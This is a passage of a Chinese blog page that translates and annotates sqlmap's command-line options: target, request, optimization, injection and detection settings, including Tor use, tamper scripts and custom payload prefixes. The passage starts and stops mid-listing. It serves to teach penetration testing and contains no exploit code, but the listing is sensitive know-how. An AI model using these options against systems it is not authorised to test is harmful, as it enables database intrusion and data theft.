class=\"builtin-name\">remove</span> all content <span class=\"keyword\">from</span> output directory</span><br><span class=\"line\"><span class=\"comment\">##  安全地从输出目录中删除所有内容</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--smart Conduct thorough tests only <span class=\"keyword\">if</span> positive heuristic(s)</span><br><span class=\"line\"><span class=\"comment\">## 只有在正启发式时才进行彻底测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--sqlmap-shell Prompt <span class=\"keyword\">for</span> an interactive sqlmap shell</span><br><span class=\"line\"><span class=\"comment\">## 提示交互式 sqlmap shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--wizard<span class=\"built_in\"> Simple </span>wizard<span class=\"built_in\"> interface </span><span class=\"keyword\">for</span> beginner users</span><br><span class=\"line\"><span class=\"comment\">## 给初级用户的简单向导界面</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>","more":"<h3 id=\"Options（选项）\"><a href=\"#Options（选项）\" class=\"headerlink\" title=\"Options（选项）\"></a>Options（选项）</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Usage</span>: python sqlmap.py [options]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">Options（选项）:</span></span><br><span class=\"line\"><span class=\"attribute\"></span></span><br><span class=\"line\">-h, --help Show basic help message and exit</span><br><span class=\"line\">## 展示帮助文档 参数</span><br><span class=\"line\"></span><br><span class=\"line\">-hh Show advanced help message and exit</span><br><span class=\"line\">## 展示详细帮助文档参数</span><br><span class=\"line\"></span><br><span class=\"line\">--version Show program's version number and exit</span><br><span class=\"line\">## 显示程序的版本号</span><br><span class=\"line\"></span><br><span class=\"line\">-v VERBOSE Verbosity level: 0-6 (default 1)</span><br><span class=\"line\">## 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure>\n<h3 id=\"Target（目标）\"><a href=\"#Target（目标）\" class=\"headerlink\" title=\"Target（目标）\"></a>Target（目标）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Target（目标）:</span><br><span class=\"line\"></span><br><span class=\"line\">At least one of these options has <span class=\"keyword\">to</span> be provided <span class=\"keyword\">to</span> define the target(s)</span><br><span class=\"line\"></span><br><span class=\"line\">-d DIRECT<span class=\"built_in\"> Connection </span>string <span class=\"keyword\">for</span> direct database connection</span><br><span class=\"line\"><span class=\"comment\">## 指定具体数据库</span></span><br><span class=\"line\"></span><br><span class=\"line\">-u URL, <span class=\"attribute\">--url</span>=URL Target URL (e.g. <span class=\"string\">\"http://www.site.com/vuln.php?id=1\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 目标URL</span></span><br><span class=\"line\"></span><br><span class=\"line\">-l LOGFILE Parse target(s) <span class=\"keyword\">from</span> Burp <span class=\"keyword\">or</span> WebScarab<span class=\"built_in\"> proxy </span>log file</span><br><span class=\"line\"><span class=\"comment\">## 解析目标(s)从Burp或WebScarab代理日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">-x SITEMAPURL Parse target(s) <span class=\"keyword\">from</span> remote sitemap(.xml) file</span><br><span class=\"line\"><span class=\"comment\">## 解析目标(s)从远程站点地图文件(.xml)</span></span><br><span class=\"line\"></span><br><span class=\"line\">-m BULKFILE Scan multiple targets given <span class=\"keyword\">in</span> a textual file</span><br><span class=\"line\"><span class=\"comment\">## 扫描文本文件中给出的多个目标</span></span><br><span class=\"line\"></span><br><span class=\"line\">-r REQUESTFILE Load HTTP request <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从本地文件加载HTTP请求 ，多用于post注入。</span></span><br><span class=\"line\"></span><br><span class=\"line\">-g GOOGLEDORK Process Google dork results as target URLs</span><br><span class=\"line\"><span class=\"comment\">## 处理Google的结果作为目标URL。</span></span><br><span class=\"line\"></span><br><span class=\"line\">-c CONFIGFILE Load options <span class=\"keyword\">from</span> a configuration INI file</span><br><span class=\"line\"><span class=\"comment\">## 从INI配置文件中加载选项。</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Request（请求）\"><a href=\"#Request（请求）\" class=\"headerlink\" title=\"Request（请求）\"></a>Request（请求）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Request（请求）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> specify how <span class=\"keyword\">to</span> connect <span class=\"keyword\">to</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来指定如何连接到目标URL。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--method</span>=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class=\"line\"><span class=\"comment\">## 强制使用给定的HTTP方法（e.g. PUT）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--data</span>=DATA Data string <span class=\"keyword\">to</span> be sent through POST</span><br><span class=\"line\"><span class=\"comment\">## 通过POST发送的数据字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--param-del</span>=PARA.. Character used <span class=\"keyword\">for</span> splitting parameter values</span><br><span class=\"line\"><span class=\"comment\">## 用于拆分参数值的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--cookie</span>=COOKIE HTTP Cookie header value HTTP</span><br><span class=\"line\"><span class=\"comment\">## Cookie头的值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--cookie-del</span>=COO.. Character used <span class=\"keyword\">for</span> splitting cookie values</span><br><span class=\"line\"><span class=\"comment\">## 用于分割Cookie值的字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--load-cookies</span>=L.. File containing cookies <span class=\"keyword\">in</span> Netscape/wget format</span><br><span class=\"line\"><span class=\"comment\">## 包含Netscape / wget格式的cookie的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">--drop-set-cookie Ignore Set-Cookie header <span class=\"keyword\">from</span> response</span><br><span class=\"line\"><span class=\"comment\">## 从响应中忽略Set-Cookie头</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--user-agent</span>=AGENT HTTP User-Agent header value</span><br><span class=\"line\"><span class=\"comment\">## 指定 HTTP User - Agent头</span></span><br><span class=\"line\"></span><br><span class=\"line\">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class=\"line\"><span class=\"comment\">##  使用随机选定的HTTP User - Agent头</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--host</span>=HOST HTTP Host header value</span><br><span class=\"line\"><span class=\"comment\">## HTTP主机头值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--referer</span>=REFERER HTTP Referer header value</span><br><span class=\"line\"><span class=\"comment\">##  指定 HTTP Referer头</span></span><br><span class=\"line\"></span><br><span class=\"line\">-H HEADER, --hea<span class=\"built_in\">..</span> Extra header (e.g. <span class=\"string\">\"X-Forwarded-For: 127.0.0.1\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 额外header</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--headers</span>=HEADERS Extra headers (e.g. <span class=\"string\">\"Accept-Language: fr\\\\nETag: 123\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 额外header</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-type</span>=AUTH.. HTTP authentication<span class=\"built_in\"> type </span>(Basic, Digest, NTLM <span class=\"keyword\">or</span> PKI)HTTP</span><br><span class=\"line\"><span class=\"comment\">## 认证类型(Basic, Digest, NTLM or PKI)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-cred</span>=AUTH.. HTTP authentication credentials (name:password)</span><br><span class=\"line\"><span class=\"comment\">##  HTTP认证凭证(name:password)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--auth-file</span>=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class=\"line\"><span class=\"comment\">## HTTP认证 PEM认证/私钥文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">--ignore-401 Ignore HTTP <span class=\"builtin-name\">Error</span> 401 (Unauthorized)</span><br><span class=\"line\"><span class=\"comment\">## 忽略HTTP错误401</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy</span>=PROXY Use a<span class=\"built_in\"> proxy </span><span class=\"keyword\">to</span> connect <span class=\"keyword\">to</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 使用代理连接到目标网址</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy-cred</span>=PRO..<span class=\"built_in\"> Proxy </span>authentication credentials (name:password)</span><br><span class=\"line\"><span class=\"comment\">## 代理认证证书(name:password)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--proxy-file</span>=PRO.. Load<span class=\"built_in\"> proxy </span>list <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从文件中加载代理列表</span></span><br><span class=\"line\"></span><br><span class=\"line\">--ignore-proxy Ignore<span class=\"built_in\"> system default proxy </span>settings</span><br><span class=\"line\"><span class=\"comment\">## 忽略系统默认代理设置</span></span><br><span class=\"line\"></span><br><span class=\"line\">--tor Use Tor anonymity network</span><br><span class=\"line\"><span class=\"comment\">## 使用Tor匿名网络</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--tor-port</span>=TORPORT <span class=\"builtin-name\">Set</span> Tor<span class=\"built_in\"> proxy port </span>other than default</span><br><span class=\"line\"><span class=\"comment\">##  设置Tor代理端口而不是默认值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--tor-type</span>=TORTYPE <span class=\"builtin-name\">Set</span> Tor<span class=\"built_in\"> proxy type </span>(HTTP (default), SOCKS4 <span class=\"keyword\">or</span> SOCKS5)</span><br><span class=\"line\"><span class=\"comment\">## 设置Tor代理类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">--check-tor Check <span class=\"keyword\">to</span> see <span class=\"keyword\">if</span> Tor is used properly</span><br><span class=\"line\"><span class=\"comment\">## 检查Tor是否正确使用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--delay</span>=DELAY Delay <span class=\"keyword\">in</span> seconds between each HTTP request</span><br><span class=\"line\"><span class=\"comment\">## 每个HTTP请求之间的延迟（秒）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--timeout</span>=TIMEOUT Seconds <span class=\"keyword\">to</span> wait before timeout<span class=\"built_in\"> connection </span>(default 30)</span><br><span class=\"line\"><span class=\"comment\">## 秒超时连接前等待（默认30）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--retries</span>=RETRIES Retries when the<span class=\"built_in\"> connection </span>timeouts (default 3)</span><br><span class=\"line\"><span class=\"comment\">##  连接超时时重试（默认值3）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--randomize</span>=RPARAM Randomly change value <span class=\"keyword\">for</span> given parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 随机更改给定参数的值(s)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-url</span>=SAFEURL URL<span class=\"built_in\"> address </span><span class=\"keyword\">to</span> visit frequently during testing</span><br><span class=\"line\"><span class=\"comment\">## 在测试期间频繁访问的URL地址</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-post</span>=SAFE.. POST data <span class=\"keyword\">to</span> send <span class=\"keyword\">to</span> a safe URL</span><br><span class=\"line\"><span class=\"comment\">## POST数据发送到安全URL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-req</span>=SAFER.. Load safe HTTP request <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从文件加载安全HTTP请求</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--safe-freq</span>=SAFE.. Test requests between two visits <span class=\"keyword\">to</span> a given safe URL</span><br><span class=\"line\"><span class=\"comment\">## 在两次访问给定安全网址之间测试请求</span></span><br><span class=\"line\"></span><br><span class=\"line\">--skip-urlencode Skip URL encoding of payload data</span><br><span class=\"line\"><span class=\"comment\">## 跳过有效载荷数据的URL编码</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--csrf-token</span>=CSR.. Parameter used <span class=\"keyword\">to</span> hold anti-CSRF token</span><br><span class=\"line\"><span class=\"comment\">## 参数用于保存anti-CSRF令牌</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--csrf-url</span>=CSRFURL URL<span class=\"built_in\"> address </span><span class=\"keyword\">to</span> visit <span class=\"keyword\">to</span> extract anti-CSRF token</span><br><span class=\"line\"><span class=\"comment\">## 提取anti-CSRF URL地址访问令牌</span></span><br><span class=\"line\"></span><br><span class=\"line\">--force-ssl Force usage of SSL/HTTPS</span><br><span class=\"line\"><span class=\"comment\">## 强制使用SSL /HTTPS</span></span><br><span class=\"line\"></span><br><span class=\"line\">--hpp Use HTTP parameter pollution method</span><br><span class=\"line\"><span class=\"comment\">## 使用HTTP参数pollution的方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">--eval</span>=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码<span class=\"string\">\"import hashlib;id2=hashlib.md5(id).hexdigest()\"</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Optimization（优化）\"><a href=\"#Optimization（优化）\" class=\"headerlink\" title=\"Optimization（优化）\"></a>Optimization（优化）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Optimization（优化）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> optimize the performance of sqlmap</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可用于优化sqlmap的性能</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-o Turn on all optimization switches</span><br><span class=\"line\"><span class=\"comment\">## 开启所有优化开关</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--predict-output Predict common queries output</span><br><span class=\"line\"><span class=\"comment\">## 预测常见的查询输出</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--keep-alive Use persistent HTTP(s) connections</span><br><span class=\"line\"><span class=\"comment\">## 使用持久的HTTP（S）连接</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--null-connection Retrieve<span class=\"built_in\"> page </span>length without actual HTTP response body</span><br><span class=\"line\"><span class=\"comment\">## 从没有实际的HTTP响应体中检索页面长度</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--threads</span>=THREADS Max number of concurrent HTTP(s) requests (default 1)</span><br><span class=\"line\"><span class=\"comment\">## 最大的HTTP（S）请求并发量（默认为1）</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Injection（注入）\"><a href=\"#Injection（注入）\" class=\"headerlink\" title=\"Injection（注入）\"></a>Injection（注入）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Injection（注入）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> specify which parameters <span class=\"keyword\">to</span> test <span class=\"keyword\">for</span>, provide custom injection payloads <span class=\"keyword\">and</span> optional tampering scripts</span><br><span class=\"line\"><span class=\"comment\">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-p TESTPARAMETER Testable parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 可测试的参数（S）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--skip</span>=SKIP Skip testing <span class=\"keyword\">for</span> given parameter(s)</span><br><span class=\"line\"><span class=\"comment\">## 跳过对给定参数的测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--skip-static Skip testing parameters that <span class=\"keyword\">not</span> appear <span class=\"keyword\">to</span> be dynamic</span><br><span class=\"line\"><span class=\"comment\">## 跳过测试不显示为动态的参数</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--param-exclude</span>=.. Regexp <span class=\"keyword\">to</span> exclude parameters <span class=\"keyword\">from</span> testing (e.g. <span class=\"string\">\"ses\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 使用正则表达式排除参数进行测试（e.g. \"ses\"）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dbms</span>=DBMS Force back-end DBMS <span class=\"keyword\">to</span> this value</span><br><span class=\"line\"><span class=\"comment\">## 强制后端的DBMS为此值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dbms-cred</span>=DBMS.. DBMS authentication credentials (user:password)</span><br><span class=\"line\"><span class=\"comment\">## DBMS认证凭证(user:password)</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--os</span>=OS Force back-end DBMS operating<span class=\"built_in\"> system </span><span class=\"keyword\">to</span> this value</span><br><span class=\"line\"><span class=\"comment\">## 强制后端的DBMS操作系统为这个值</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-bignum Use big numbers <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用大数字使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-logical Use logical operations <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用逻辑操作使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--invalid-string Use random strings <span class=\"keyword\">for</span> invalidating values</span><br><span class=\"line\"><span class=\"comment\">## 使用随机字符串使值无效</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--no-cast Turn off payload casting mechanism</span><br><span class=\"line\"><span class=\"comment\">## 关闭有效载荷铸造机制</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--no-escape Turn off string escaping mechanism</span><br><span class=\"line\"><span class=\"comment\">## 关闭字符串转义机制</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--prefix</span>=PREFIX Injection payload<span class=\"built_in\"> prefix </span>string</span><br><span class=\"line\"><span class=\"comment\">## 注入payload字符串前缀</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--suffix</span>=SUFFIX Injection payload suffix string</span><br><span class=\"line\"><span class=\"comment\">## 注入payload字符串后缀</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--tamper</span>=TAMPER Use given script(s) <span class=\"keyword\">for</span> tampering injection data</span><br><span class=\"line\"><span class=\"comment\">## 使用给定的脚本（S）篡改注入数据</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Detection（检测）\"><a href=\"#Detection（检测）\" class=\"headerlink\" title=\"Detection（检测）\"></a>Detection（检测）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Detection（检测）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> customize the detection phase</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--level</span>=LEVEL Level of tests <span class=\"keyword\">to</span> perform (1-5,<span class=\"built_in\"> default </span>1)</span><br><span class=\"line\"><span class=\"comment\">## 执行测试的等级（1-5，默认为1）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--risk</span>=RISK Risk of tests <span class=\"keyword\">to</span> perform (1-3,<span class=\"built_in\"> default </span>1)</span><br><span class=\"line\"><span class=\"comment\">## 执行测试的风险（0-3，默认为1）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--string</span>=STRING String <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">##  查询时有效时在页面匹配字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--not-string</span>=NOT.. String <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"comment\">## 当查询求值为无效时匹配的字符串</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--regexp</span>=REGEXP Regexp <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">## 查询时有效时在页面匹配正则表达式</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--code</span>=CODE HTTP code <span class=\"keyword\">to</span> match when query is evaluated <span class=\"keyword\">to</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">## 当查询求值为True时匹配的HTTP代码</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--text-only Compare pages based only on the textual content</span><br><span class=\"line\"><span class=\"comment\">## 仅基于在文本内容比较网页</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--titles Compare pages based only on their titles</span><br><span class=\"line\"><span class=\"comment\">##  仅根据他们的标题进行比较</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Techniques（技巧）\"><a href=\"#Techniques（技巧）\" class=\"headerlink\" title=\"Techniques（技巧）\"></a>Techniques（技巧）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 